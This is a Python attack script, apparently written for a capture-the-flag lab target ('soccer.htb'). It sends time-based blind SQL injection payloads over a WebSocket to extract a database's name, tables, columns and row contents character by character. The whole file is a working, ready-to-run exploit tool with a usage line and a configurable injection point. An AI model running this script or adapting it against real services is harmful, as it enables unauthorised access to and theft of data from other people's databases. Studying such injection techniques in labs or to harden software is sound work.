#!/usr/bin/python3

"""
connect to ws and send request with sqli payload
wait response and find database, tables, columns, data
"""

import json
import websocket as ws
import signal
import time
import sys
from pwn import *
from termcolor import colored

ascii_art ="""

                        _ _ 
__      _____ ___  __ _| (_)
\ \ /\ / / __/ __|/ _` | | |
 \ V  V /\__ \__ \ (_| | | |
  \_/\_/ |___/___/\__, |_|_|
                     |_|    

By Alpy06

usage: python3 wsqli.py ws://target_ip:1234 

"""

print(colored(ascii_art,'red'))


def exit_handler(sig, frame):
    print("\n[-] Bye hacker!")
    sys.exit(1)


signal.signal(signal.SIGINT, exit_handler)

#Take target argument
target_ws = sys.argv[1] 
#"ws://soc-player.soccer.htb:9091"

#base_payload ="' or if(substr(database(),%d,1)='%c',sleep(5),1)-- -" % (i, c)

charset = r'abcdefghijklmnopqrstuvwxyz_.@012345ABCDEFGHJIKLMNOPRSTUVYZ'

def create_con(target_ws):
    ws_con = ws.create_connection(target_ws)
    return ws_con


def send_and_get(payload):
    start_time = time.time()
    ws_con.send(json.dumps({"id": f"{payload}"})) #CHANGE THIS if injection point is different from id
    result = ws_con.recv()
    finish_time = time.time()

    recv_time = finish_time - start_time
    if recv_time >= 5.0:
        return 1
    else:
        return 0


try:
    print("Connecting to ws...")
    ws_con = create_con(target_ws)
    print("Connecting to ws:" + colored("OK",'green'))
    print("Starting Attack!")
    print("Target: ", colored(target_ws,'red'))

except:
    print(colored("Error! Check connection or attack parameters. ",'red'))
    exit()


def database():
    p1 = log.progress(colored("Database: ",'blue'))
    database_name = ''
    for i in range(1, 20):
        for c in charset:
            time_based_payload = "1 or if(substr(database(),%d,1)='%c',sleep(5),1)-- -" % (i, c)
            attack = send_and_get(time_based_payload)
            if attack == 1:
                database_name += c
                
                p1.status("%s" % database_name)
                break
    return database_name

def tables(database_name):
    table_name = ''
    p1 = log.progress(colored("Tables: ",'blue'))
    #p2 = log.progress("Payload:")
    for i in range(1, 10):
        for c in charset:
            time_based_payload = "1 or if(substr((select table_name from information_schema.tables where table_schema='%s'),%d,1)='%c',sleep(5),1)-- -" % (database_name, i, c)
            attack = send_and_get(time_based_payload)
            #p2.status("%s" % time_based_payload)
            if attack == 1:
                table_name += c
                
                p1.status("%s" % table_name)
                break
    return table_name

def columns(table_name, database_name):
    for j in range(0,5):
        column_name = ''
        p1 = log.progress(colored("Columns: ",'blue'))
        #p2 = log.progress("Payload Columns:")

        
            
        for i in range(1, 10):
            for c in charset:
                #time_based_payload = "1 or (select sleep(5) from information_schema.columns where table_name='%s' and substr(column_name,%d,1)='%s')#" % (table_name, i, c)
                #time_based_payload = "1 or if(substr((select column_name from information_schema.columns where table_schema='%s'),%d,1)='%c',sleep(5),1)-- -" % (database_name, table_name, i, c)
                time_based_payload = "1 or if(substr((select column_name from information_schema.columns where table_schema='%s' and table_name='%s' limit %d,1),%d,1)='%c',sleep(5),1)-- -" % (database_name, table_name, j, i, c)


                attack = send_and_get(time_based_payload)
                #p2.status("%s" % time_based_payload)
                if attack == 1:
                    column_name += c                
                    p1.status("%s" % column_name)
                    break
        
        data(column_name,table_name)
    return column_name

def data(column_name, table_name):
    for j in range(0,1):
        data = ''
        p1 = log.progress(colored("Data: ",'green'))
        #p2 = log.progress("Payload Data:")
        for i in range(1, 24):
            for c in charset:
                #time_based_payload = "1 or if(substr((select column_name from information_schema.columns where table_schema='%s' and table_name='%s' limit %d,1),%d,1)='%c',sleep(5),1)-- -" % (database_name, table_name, j, i, c)
                time_based_payload =  "1 or if(ord(substr((select %s from %s limit %d,1),%d,1))=%d,sleep(5),1)-- -" % (column_name, table_name, j, i, ord(c))

                attack = send_and_get(time_based_payload)
                #p2.status("%s" % time_based_payload)
                if attack == 1:
                    data += c                
                    p1.status("%s" % data)
                    break
    return data


get_database_name = database()
print(colored(get_database_name, 'red'))
get_table_name = tables(get_database_name)
print(colored(get_table_name, 'red'))
get_column_names = columns(get_table_name, get_database_name)


